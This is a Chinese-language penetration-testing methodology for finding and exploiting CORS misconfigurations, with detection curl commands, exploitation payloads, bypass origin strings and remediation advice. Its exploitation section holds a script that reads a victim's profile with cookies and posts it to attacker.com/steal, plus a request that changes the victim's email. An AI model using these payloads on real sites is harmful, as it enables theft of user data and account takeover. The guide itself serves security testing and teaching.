# CORS 配置错误利用方法论

---

# 第一部分：文档概述

## 1.1 编写目的

本文档旨在为渗透测试人员提供一套标准化的 CORS（跨域资源共享）配置错误检测与利用流程。

## 1.2 适用范围

本文档适用于所有提供 API 接口或需要跨域访问的 Web 应用。

## 1.3 读者对象

本文件主要面向执行渗透测试任务的安全工程师、安全分析师。

---

# 第二部分：核心渗透技术专题

## 2.1 技术介绍

### 漏洞原理

CORS 配置错误是指服务器返回的 CORS 响应头过于宽松，允许不受信任的源访问 API 资源，导致攻击者可以从恶意网站发起跨域请求获取敏感数据。

**本质问题**：
- Access-Control-Allow-Origin 配置过于宽松
- 允许凭证的跨域请求
- 缺少来源验证

### 常见 CWE 映射

| CWE 编号 | 描述 |
|---------|------|
| CWE-942 | 允许不受信任域的宽松跨域策略 |
| CWE-284 | 不当访问控制 |

## 2.2 攻击常见于哪些业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| API 接口 | REST API | 允许任意源访问 |
| 单页应用 | 前后端分离 | CORS 配置宽松 |
| 移动应用 | 后端 API | 未限制来源 |
| 微服务 | 服务间通信 | CORS 未正确配置 |

## 2.3 漏洞发现方法

### 2.3.1 CORS 头检测

```bash
# 检查 CORS 响应头
curl -H "Origin: https://evil.com" \
     -v https://target.com/api/data

# 检查响应头：
# Access-Control-Allow-Origin: https://evil.com  (危险)
# Access-Control-Allow-Origin: *                 (中等)
# Access-Control-Allow-Credentials: true         (危险组合)
```

### 2.3.2 动态来源检测

```bash
# 测试不同来源
curl -H "Origin: https://evil.com" ...
curl -H "Origin: https://attacker.com" ...
curl -H "Origin: null" ...

# 如果服务器反射来源，则存在漏洞
```

### 2.3.3 凭证测试

```bash
# 测试是否允许凭证
curl -H "Origin: https://evil.com" \
     -H "Cookie: session=xxx" \
     -v https://target.com/api/data

# 如果返回 Access-Control-Allow-Credentials: true
# 则可以窃取带 Cookie 的请求响应
```

## 2.4 漏洞利用方法

### 2.4.1 数据窃取

```html
<!-- 恶意网站上的攻击代码 -->
<script>
fetch('https://target.com/api/user/profile', {
    method: 'GET',
    credentials: 'include',  // 包含 Cookie
    mode: 'cors'
}).then(response => response.json())
  .then(data => {
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal', {
        method: 'POST',
        body: JSON.stringify(data)
    });
  });
</script>
```

### 2.4.2 未授权操作

```html
<!-- 执行未授权操作 -->
<script>
fetch('https://target.com/api/user/update', {
    method: 'POST',
    credentials: 'include',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
        email: 'attacker@example.com'
    })
});
</script>
```

### 2.4.3 组合 XSS 攻击

```html
<!-- CORS + XSS 组合攻击 -->
<script>
// 1. 利用 CORS 获取敏感数据
// 2. 利用 XSS 执行恶意代码
// 3. 窃取数据并发送
</script>
```

## 2.5 漏洞利用绕过方法

### 2.5.1 来源验证绕过

```bash
# 测试 Origin 头覆盖
Origin: https://target.com.evil.com
Origin: https://evil.com/target.com
Origin: https://target.com@evil.com
```

### 2.5.2 空来源测试

```bash
# 某些配置允许 null 来源
Origin: null

# 通过 sandbox iframe 产生 null 来源
<iframe sandbox="allow-scripts" src="...">
```

---

# 第三部分：附录

## 3.1 CORS 测试检查清单

```
□ 检查 Access-Control-Allow-Origin
□ 测试来源反射
□ 测试凭证允许
□ 测试 null 来源
□ 测试通配符配置
□ 测试预检请求缓存
```

## 3.2 修复建议

1. **限制允许的源** - 明确列出可信源
2. **避免使用通配符** - 不要使用 `*` 配合凭证
3. **验证来源** - 服务端验证 Origin 头
4. **设置合理缓存** - 控制预检请求缓存时间

---

**参考资源**：
- [OWASP CORS Security](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger - CORS](https://portswigger.net/web-security/cors)
